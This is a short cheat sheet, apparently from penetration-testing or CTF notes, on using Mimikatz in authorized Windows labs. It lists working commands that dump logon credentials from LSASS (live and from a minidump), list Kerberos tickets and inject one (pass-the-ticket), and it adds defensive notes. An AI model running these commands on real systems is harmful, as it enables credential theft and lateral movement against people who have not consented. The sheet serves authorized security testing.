# Mimikatz Cheat Sheet

Use only in authorized Windows labs or engagements. Mimikatz is heavily detected; prefer documented lab snapshots and avoid running it on systems outside scope.

## When It Applies

- You have local administrator or SYSTEM context.
- You need to inspect credential material in a lab.
- You are validating credential exposure risk.

## Safer Prep

- Confirm privileges: `whoami /priv`
- Confirm architecture: `wmic os get osarchitecture`
- Prefer offline analysis when possible.
- Document what you collect and why.

## Common Authorized Workflows

### Logon Session Review

```text
privilege::debug
sekurlsa::logonpasswords
```

### Dump LSASS Offline Instead

Create a dump with an approved method, transfer it to a lab box, then analyze offline:

```text
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

### Pass-The-Hash Context

Mimikatz can inject or use NTLM material in lab scenarios, but for most CTF workflows Impacket and CrackMapExec are simpler from Linux. See [Pass-the-Hash Cheat Sheet](Pass-the-Hash%20Cheat%20Sheet.md).

### Kerberos Tickets

```text
sekurlsa::tickets
kerberos::list
kerberos::ptt ticket.kirbi
```

## Defensive Notes

- LSASS protection, Credential Guard, EDR, and AV may block or alert.
- Avoid copying credential material into shared notes.
- Prefer hash/ticket identifiers and sanitized examples.

